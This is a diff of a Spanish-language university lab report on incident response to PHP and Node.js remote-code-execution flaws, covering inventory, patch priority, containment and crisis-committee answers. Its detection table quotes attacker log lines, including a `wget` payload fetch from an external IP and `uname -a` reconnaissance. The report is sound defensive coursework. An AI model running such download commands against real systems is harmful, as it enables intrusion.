@@ -5,10 +5,15 @@
 
 | Integrante | Usuario de GitHub | Rol en el TP |
 |---|---|---|
-| Lorenzo Bellomo | LoLoo3 | Inventario, cambios/parche, detección, contención/comunicación |
+| Lorenzo Bellomo | LoLoo03 | Inventario, cambios/parche, detección, contención/comunicación |
+| Agustin Ignacio Kloster | AgusKlos | Revisión de `entrega.md` y `deteccion.md`, preparación del comité |
 
-> El taller lo ejecutó un solo integrante presente en el aula; por eso concentra los
-> cuatro roles. Las horas están en UTC (reloj de Docker); en Argentina son UTC−3.
+> El taller en el aula (29/10) lo ejecutó un solo integrante, Lorenzo Bellomo; por eso
+> concentra los cuatro roles, y su `informe.md` lo refleja. La revisión posterior
+> (30/10), a cargo de Agustin Ignacio Kloster, se hizo sobre el código del laboratorio,
+> `audit.log` y las capturas, **sin volver a levantar el laboratorio**: lo que agrega
+> esa revisión es análisis, no evidencia nueva de ejecución.
+> Las horas están en UTC (reloj de Docker); en Argentina son UTC−3.
 
 ---
 
@@ -21,19 +26,33 @@ Evidencia: [`capturas/01-inventario-antes.txt`](capturas/01-inventario-antes.txt
 | Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
 |--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
 | Portal PHP (`php-lab`, web01) | PHP 8.3.35, Apache + mod_php | No en el lab / Sí en el despliegue supuesto | Sí: formulario con sesiones y subida de archivos | **Sí** (PHP2Shell, CVE-2026-109618/109619; corregido en 8.3.36) | `PHP 8.3.35 (cli)`; `session.upload_progress.enabled=1`; imagen `php:8.3.35-apache`; `docker top` muestra `apache2 -DFOREGROUND` (master root + workers www-data), sin `php-fpm` |
-| API Node.js (`node-lab`, api01) | Node v22.23.3, brotli 1.1.0 (del runtime), Express 5 | No en el lab / Sí en el despliegue supuesto | Sí: `POST /decode` descomprime cuerpos `Content-Encoding: br` de clientes | **Sí** (Node2Shell, CVE-2026-111497; corregido en 22.23.4) | `v22.23.3 / brotli 1.1.0`; `npm ls` sin paquete brotli externo: el decoder lo aporta el runtime |
-| Servicio Python (`py-lab`, svc01) | Python 3.11.18, brotli 1.0.9 (PyPI) | No | Parcial: decodifica `br` de lo que le llega por la red interna | **Sí** (CVE-2026-111497; brotli 1.0.3–1.2.0 afectado, corregido en 1.2.1) | `brotli 1.0.9` |
+| API Node.js (`node-lab`, api01) | Node v22.23.3, brotli 1.1.0 (del runtime), Express 5 | No en el lab / Sí en el despliegue supuesto | Sí: `POST /decode` recibe cuerpos `Content-Encoding: br` de clientes; el decoder corre en body-parser (`express.raw`) antes del handler | **Sí** (Node2Shell, CVE-2026-111497; corregido en 22.23.4) | `v22.23.3 / brotli 1.1.0`; `npm ls` sin paquete brotli externo: el decoder lo aporta el runtime |
+| Servicio Python (`py-lab`, svc01) | Python 3.11.18, brotli 1.0.9 (PyPI) | No | Parcial: decodifica `br` de lo que le llega por la red interna | **Sí** (CVE-2026-111497; brotli 1.0.3–1.2.0 afectado, corregido en 1.0.10 / 1.1.1 / 1.2.1) | `brotli 1.0.9` |
 
 **SAPI de PHP.** `inventario.sh` corre `php -v` por CLI, así que muestra `(cli)`. El
 SAPI web se deduce de la imagen `-apache` y del árbol de procesos: solo hay
 `apache2`, sin `php-fpm`, por lo tanto PHP corre como módulo de Apache (mod_php), el
 caso de **mayor riesgo** según el aviso: el ataque ocurre antes de que corra la app.
 No imprimimos el SAPI web directamente (la página `index.php` lo muestra, pero no hay
-puertos publicados y la guía no incluye un comando para pedirla).
+puertos publicados y la guía no incluye un comando para pedirla). En la sección 3
+dejamos el comando que lo haría, sin ejecutar.
 
 **Brotli en Node: el string no alcanza como evidencia.** El runtime informa brotli
 1.1.0 en la versión vulnerable y sigue informando 1.1.0 en la corregida
 (ver sección 3). La señal válida es la versión de Node (22.23.4), no el string.
+
+**Dónde se decodifica Brotli en la API.** `server.js` usa `express.raw()` en
+`POST /decode`. En Express 5, `express.raw` es body-parser 2, que por defecto
+(`inflate: true`) **ya descomprime** los cuerpos con `Content-Encoding: br` antes de
+que corra el handler (`recursos/contexto.md`, "Cómo llega al decoder"). Esto sale de
+leer el código y la documentación; no se probó en el laboratorio. Consecuencias:
+
+- El decoder vulnerable se alcanza en body-parser aunque el handler no hiciera nada
+  con Brotli. Sacar `brotliDecompressSync` del handler no saca a la API del alcance.
+- El handler vuelve a decodificar un cuerpo que ya llega descomprimido, así que un
+  `POST /decode` legítimo con `br` probablemente responda `400 brotli invalido`. Es
+  un bug funcional, ajeno al CVE, que solo aparecería con una prueba funcional con
+  un cuerpo Brotli benigno (ver "Qué no se pudo probar").
 
 **Supuestos de exposición:**
 
@@ -68,7 +87,7 @@ Las imágenes de PHP y Python se obtuvieron sin cambios.
 |--------|:----:|:----------------:|:----------:|:----------:|------------------|
 | Portal PHP | 9.2 (CVSS 4.0) | **Sí**: confirmada, en CISA KEV desde 26/10 | Alta (supuesto: publicado, mod_php) | Alta: datos de legajos de personal | **1.º — Ya.** Mitigación inmediata (`upload_progress = 0`) y parche a 8.3.36 en ventana de emergencia, **< 24 h** |
 | API Node.js | 9.2 (Google, CNA) / High (Node.js) | No confirmada al 27/10; RCE demostrado en laboratorio | Alta (supuesto: recibe `br` de clientes; Express 5 descomprime) | Media-alta | **2.º — < 72 h.** Parche a 22.23.4 en ventana de cambio; mientras tanto, rechazar `Content-Encoding: br` en el proxy |
-| Servicio Python | 9.2 (mismo CVE) | No confirmada | Baja: solo red interna | Media | **3.º — ventana estándar, ≤ 7 días.** Actualizar brotli a 1.2.1 |
+| Servicio Python | 9.2 (mismo CVE) | No confirmada | Baja por diseño (solo red interna), pero **alcanzada**: el log muestra comandos en svc01 | Media | **3.º — < 72 h.** Actualizar brotli (1.0.10 o 1.2.1). Sin el incidente iría en la ventana estándar (≤ 7 días); sube por la actividad detectada (ver abajo) |
 
 **Justificación:** el orden no sale del CVSS (los tres tienen 9.2) sino de la
 **explotación real** y la **exposición**. PHP2Shell está en KEV y se explota desde
@@ -76,7 +95,8 @@ antes del disclose; con mod_php no importa qué hace la app. Node2Shell tiene el
 puntaje pero todavía no hay explotación maliciosa confirmada, y la API se puede
 proteger mientras tanto filtrando Brotli en el borde. El servicio Python comparte el
 CVE pero no recibe tráfico externo: para llegar a él, el atacante primero tiene que
-estar adentro.
+estar adentro. Por eso es el tercero, aunque comparte plazo con la API por lo que
+muestra el log.
 
 **Qué evidencia cambiaría el orden:**
 
@@ -84,9 +104,29 @@ estar adentro.
   la API pasa a emergencia (< 24 h), igual que PHP.
 - Se descubre que el proxy o algún cliente interno reenvía cuerpos `br` externos al
   servicio Python → sube a la prioridad de la API.
-- El log de la sección 4 (procesos hijos de `python` en svc01) indica actividad en el
-  servicio interno: si se confirma, svc01 deja de ser "solo interno" y se trata como
-  comprometido, no como un activo que solo espera el parche.
+- Actividad del atacante en el servicio interno (procesos hijos de `python` en
+  svc01) → svc01 deja de ser "solo interno" y se trata como comprometido, no como un
+  activo que solo espera el parche.
+
+**Esta última evidencia ya apareció.** [`deteccion.md`](deteccion.md) concluye que hubo
+ejecución de comandos en web01, api01 **y svc01** (27/10, 09:42–09:45 UTC). La matriz
+de arriba es la decisión por vulnerabilidad. Con el compromiso detectado, en
+producción va precedida por un paso 0 que no depende del CVSS:
+
+| Paso | Activo | Acción | Plazo |
+|---|---|---|---|
+| 0 | web01, api01, svc01 | Tratar como incidente: aislar de la red, preservar evidencia (memoria, disco, logs) y rotar los secretos accesibles desde esos servicios | Inmediato, antes de parchear |
+| 0 | db01 | Identificar las sesiones SSH de 09:42–09:49 (usuario, origen, método). Si no se explican, se suma al incidente | Inmediato |
+| 1–3 | Los tres | Parchear según la matriz, **reconstruyendo desde imágenes limpias** y no sobre el contenedor comprometido | Plazos de la matriz |
+
+- Parchear un servicio comprometido cierra la entrada, pero no saca al atacante.
+  Por eso el aislamiento va primero.
+- **svc01 sube de plazo.** Lo pusimos último porque suponíamos que solo era
+  alcanzable desde adentro. Que haya ejecutado `uname -a` demuestra que alguien ya
+  llega a él. Por eso su parche pasó de ≤ 7 días al plazo de la API (**< 72 h**, ya
+  reflejado en la matriz) y su reconstrucción entra en el paso 0.
+- No cambia el orden entre PHP y Node: el log no permite atribuir el acceso a uno u
+  otro CVE (ver "Lo que no sabemos" en `deteccion.md`).
 
 En el laboratorio, como el costo era bajo y no hay usuarios reales, aplicamos los tres
 parches en la misma sesión; el orden de arriba es el que aplicaríamos en producción.
@@ -118,7 +158,13 @@ docker compose --env-file versions.env up -d --wait
 
 **Ventana de cambio.** En el lab, el corte fue de unos segundos por servicio
 (recreación de contenedores). En producción, PHP va en ventana de emergencia el mismo
-día; Node en la próxima ventana dentro de 72 h; Python en la ventana semanal.
+día; Node y Python en la próxima ventana dentro de 72 h. Python iría en la ventana
+semanal, pero subió por la actividad detectada en svc01 (sección 2).
+
+**Versión destino de brotli en Python.** El aviso corrige en 1.0.10, 1.1.1 y 1.2.1.
+`parchear.sh` sube de 1.0.9 a 1.2.1, que es un salto de rama. En producción, el
+cambio mínimo y de menor riesgo de compatibilidad sería 1.0.10, dentro de la misma
+rama 1.0.x. En el lab se usó 1.2.1 porque es lo que define la cátedra.
 
 **Detalle del ajuste de entorno (Kaspersky).** La CA se exportó del almacén de
 certificados raíz de Windows a un archivo PEM (`kaspersky-ca.crt`) fuera del repo.
@@ -157,12 +203,29 @@ La verificación TLS no se desactivó: npm sigue validando el certificado, pero 
 la CA de Kaspersky. La CA se borra de la imagen al terminar la instalación.
 
 **Prueba funcional mínima:** después de la mitigación y después del parche, los tres
-servicios pasaron su healthcheck (`docker compose ps` → `healthy`), que es una prueba
-funcional real de cada app y no solo del contenedor:
+servicios pasaron su healthcheck (`docker compose ps` → `healthy`). El alcance de esa
+prueba no es el mismo en los tres:
 
-- PHP: abre una conexión a `127.0.0.1:80` (Apache atiende).
-- Node: `fetch('http://127.0.0.1:3000/')` y exige respuesta `ok` (Express responde).
-- Python: `urlopen('http://127.0.0.1:8000/')` (el servidor HTTP responde).
+- Node: `fetch('http://127.0.0.1:3000/')` y exige respuesta `ok`. Ejecuta la ruta `/`
+  de Express: prueba la app.
+- Python: `urlopen('http://127.0.0.1:8000/')`. Ejecuta `do_GET`, que consulta el
+  módulo `brotli`: prueba la app.
+- PHP: `php -r` con `fsockopen('127.0.0.1', 80)`. Solo comprueba que Apache **acepta
+  conexiones TCP**, y lo hace desde el PHP de **CLI**. No prueba que mod_php
+  interprete `index.php`: un Apache con el módulo PHP roto pasaría igual.
+
+En PHP, entonces, la prueba funcional es más débil que en los otros dos. Este comando
+la cerraría sin publicar puertos ni salir de la red, porque pide la página por
+loopback dentro del mismo contenedor. **No se ejecutó**: se identificó en la revisión
+del 30/10, con el laboratorio ya apagado.
+
+```bash
+docker compose exec -T php-lab php -r 'echo file_get_contents("http://127.0.0.1/");' \
+  | grep -A1 -E 'PHP:|SAPI:|upload_progress'
+```
+
+Resultado esperado: `8.3.36`, `apache2handler` y `upload_progress.enabled` en `0`.
+Además confirmaría el SAPI web, que en la sección 1 se dedujo del árbol de procesos.
 
 **Qué no se pudo probar:**
 
@@ -199,7 +262,7 @@ reconocimiento (`id`, `uname`) o URLs a IPs externas.
 | 2026-10-27T09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Segunda descarga desde web01, a otra IP externa |
 | 2026-10-27T09:45:10Z / :11Z | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento en el servicio **interno**: posible movimiento lateral |
 | 09:42:40Z, 09:44:10Z, 09:49:00Z | db01 | `sshd` → `-bash` | Indeterminado | Puede ser una sesión administrativa; coincide con la ventana del ataque y db01 no está inventariado |
-| 09:45:00Z, 09:47:00Z / 09:43:40Z | api01 / svc01 | `node` → `node server.js` / `python` → `python app.py` | No (baja) | Mismo binario y argumentos del servicio: compatible con un reinicio o supervisor |
+| 09:45:00Z, 09:47:00Z / 09:43:40Z | api01 / svc01 | `node` → `node server.js` / `python` → `python app.py` | Baja, a confirmar | Mismo binario y argumentos del servicio: compatible con un reinicio o supervisor. Pero rodean a los hallazgos de api01 y svc01 y podrían ser intentos fallidos que tiraron el proceso (`deteccion.md` §2.2) |
 
 **¿Hay compromiso?** Sí en web01, api01 y svc01: hay ejecución de comandos desde los
 procesos de los servicios, en 3 minutos (09:42–09:45), con una secuencia típica de
@@ -238,7 +301,7 @@ Evidencia: [`capturas/03-contencion-antes.txt`](capturas/03-contencion-antes.txt
 | Filesystem read-only | `read_only: true` + `tmpfs` solo en `/tmp` (y rutas de Apache) | `read_only: true` en los 3 servicios en `docker compose config`; código de PHP montado `:ro` | **Sí** (declarado) | No se puede modificar el código ni dejar un webshell persistente; lo que se escriba en `tmpfs` desaparece al reiniciar |
 | Capabilities mínimas | `cap_drop: ALL`; PHP recupera solo `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`; `no-new-privileges:true` | `docker compose config` | **Sí** (declarado) | Sin capacidades de red cruda, montaje ni administración; `no-new-privileges` bloquea escalar con binarios setuid |
 | Límites de memoria/PIDs | `mem_limit` 256 MB (PHP, Node) / 128 MB (Python); `pids_limit` 100 / 100 / 50 | `docker compose config` | **Sí** (declarado) | Acota minería, fork bombs y que un contenedor comprometido tumbe al host |
-| Rechazo de Brotli innecesario | No configurado: `POST /decode` acepta `Content-Encoding: br` | `node/server.js` decodifica `br` explícitamente | **No** | Control propuesto: rechazar `br` en el proxy (o en Express) mientras no se parchee. Cortaría el camino de entrada de Node2Shell |
+| Rechazo de Brotli innecesario | No configurado: `POST /decode` acepta `Content-Encoding: br` | `node/server.js`: `express.raw()` con `inflate` por defecto (`true`) | **No** | Control propuesto mientras no se parchee: rechazar `br` en el proxy, o en la app con `express.raw({ inflate: false })`, que hace que body-parser responda 415 a cuerpos comprimidos **antes** de tocar el decoder. Un filtro dentro del handler llegaría tarde. Corta el camino de entrada de Node2Shell; costo: `/decode` deja de aceptar Brotli, así que es temporal |
 
 **Prueba de salida a Internet:** falla en los tres servicios, antes y después del
 parche: PHP `SIN SALIDA`, Node `SIN SALIDA TypeError`, Python `SIN SALIDA URLError`.
@@ -261,8 +324,9 @@ RCE en el portal llegue directo al servicio interno.
 
 ## 6. Conclusión (5 líneas)
 
-1. En las primeras 2 horas, mitigaríamos PHP antes de cualquier otra cosa: es un
-   cambio de una línea, reversible, y PHP2Shell ya se explota.
+1. En las primeras 2 horas, si hay señales de compromiso, aislaríamos y
+   preservaríamos evidencia antes de parchear. Entre los parches, PHP va primero:
+   es un cambio de una línea, reversible, y PHP2Shell ya se explota.
 2. Inventariaríamos dependencias transitivas y proxies, no solo runtimes: Brotli llega
    por Node, Express, `fetch` y Envoy aunque nadie lo importe.
 3. Usaríamos la versión del runtime como evidencia, no el string de Brotli, que no
@@ -274,7 +338,33 @@ RCE en el portal llegue directo al servicio interno.
 
 ---
 
-## 7. Checklist antes de entregar
+## 7. Preparación del comité de crisis
+
+Respuestas preparadas para las preguntas de [`docs/comite.md`](../../docs/comite.md),
+apoyadas en la evidencia de las secciones anteriores.
+
+**Mensaje de apertura (2 min).** El 21/10 se publicaron dos fallas que afectan a
+nuestros tres sistemas. Una, en el portal de legajos, ya se usa para atacar
+organizaciones reales. La otra, en la API, todavía no. Además, los registros del
+27/10 muestran comandos que nuestros sistemas no ejecutan normalmente, así que lo
+tratamos como un incidente y no solo como un parche pendiente. **Pedimos dos
+decisiones:** autorización para aislar hoy los tres servicios afectados y una ventana
+de emergencia para actualizar el portal en menos de 24 horas.
+
+| # | Pregunta | Respuesta | Evidencia |
+|---|---|---|---|
+| 1 | ¿Parcheamos en caliente facturación sin entorno de pruebas? | No a ciegas, pero tampoco esperamos. Ahora: mitigación de una línea, reversible en segundos. El mismo día: respaldo, ventana corta, actualización y una operación de prueba (emitir una factura de prueba). Volver atrás es la misma operación que actualizar. Con una falla en KEV, el riesgo de no parchear es mayor | §3: mitigación y reversión de PHP; parche en segundos por servicio |
+| 2 | El hosting no actualiza PHP hasta el viernes. ¿Qué compensamos? | Hasta el viernes: (a) `upload_progress = 0`; (b) restringir quién llega al portal (VPN o lista de IPs, si el uso lo permite); (c) bloquear la salida a Internet del servidor; (d) alerta por procesos hijos de `apache2`. Verificación: valor del `.ini`, prueba de salida que falla y regla probada contra `audit.log`. El dueño del portal firma la aceptación del riesgo residual hasta el viernes | §3, §5 (`SIN SALIDA`), `deteccion.md` §4 |
+| 3 | Node2Shell no se explota todavía. ¿Ventana de emergencia? | Por el CVE solo, no: se cubre rechazando Brotli (proxy o `inflate: false`) y parcheando en < 72 h. Pasaríamos a emergencia si entra en KEV, aparece un exploit público o vemos intentos propios (cuerpos `br` anómalos, reinicios por crash de `node`). **En nuestro caso** ya hay ejecución de comandos en api01: la urgencia viene del incidente, no del CVE | §2, §5, `deteccion.md` §2.2 |
+| 4 | ¿Qué le decimos a clientes y cuándo? | Cuando tengamos el alcance mínimo y la contención en marcha, sin esperar a cerrar la investigación. Mensaje: detectamos actividad no autorizada, la contuvimos, estamos investigando si hubo acceso a datos y decimos qué deberían hacer ellos. Nunca: versiones, qué falta parchear, IPs ni vector. Como el portal guarda datos personales, legales evalúa si hay obligación de notificar según la normativa de protección de datos personales (en Argentina, Ley 25.326). Esa obligación no la verificamos nosotros | No aplica: es una decisión de legales y comunicación, no una afirmación técnica |
+| 5 | Si el atacante usa un agente para post-explotación, ¿qué sigue funcionando? | Lo que no depende del perímetro: sin salida a Internet (la segunda etapa no descarga), usuario sin privilegios (en Node, Python y los workers de Apache; **no** en el master de Apache, que corre como root: si el shell colgó de él, como plantea `deteccion.md` §2.1, ese control no aplicó en web01), filesystem de solo lectura, `no-new-privileges` y límites de PIDs. Un agente trabaja en lotes rápidos, y la alerta por proceso hijo dispara en el primer comando. Lo que **no** frena: el movimiento lateral dentro de la red interna (svc01) → segmentar | §5, `deteccion.md` §2.1 y §4 |
+| 6 | ¿Qué nos hace pasar de "monitorear" a "apagar"? | Ejecución de comandos desde un servicio (ya la tenemos, 27/10), conexiones salientes exitosas, acceso no explicado a db01 o señales de exfiltración. Con la primera ya corresponde **aislar**, que es lo que pedimos autorizar en la apertura. Apagar destruye la memoria, que es evidencia: preferimos cortar la red y apagar solo si aislar no alcanza | `deteccion.md` §2 |
+| 7 | El CERT avisa un martes a las 9:40. ¿Qué hacemos primero? | 9:40–10:00: ¿tenemos el producto?, ¿dónde?, ¿expuesto? (inventario, incluidas las dependencias que vienen dentro de otros componentes). 10:00–11:00: mitigación reversible en lo expuesto y búsqueda en los logs **desde antes** del aviso. Antes del mediodía: dueños, ventana y mensaje interno. Un responsable por tarea | §1, §6 |
+| 8 | ¿Cómo sabemos que el parche quedó y que la app funciona? | Por la versión que informa cada runtime (8.3.36, v22.23.4, brotli 1.2.1), no por el string de Brotli de Node, que no cambia. Y con una prueba funcional: los healthchecks pasan, aunque en PHP la prueba es débil y lo declaramos | §3, [`capturas/06-parche-despues.txt`](capturas/06-parche-despues.txt) |
+
+---
+
+## 8. Checklist antes de entregar
 
 - [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
 - [x] Inventario con evidencia (versión, SAPI, configuración).
@@ -286,4 +376,4 @@ RCE en el portal llegue directo al servicio interno.
 - [x] Sin claves, tokens ni placeholders.
 - [ ] Repo pusheado y PR abierto.
 
-Checklist completa: [`../docs/checklist-entrega.md`](../docs/checklist-entrega.md).
+Checklist completa: [`../../docs/checklist-entrega.md`](../../docs/checklist-entrega.md).
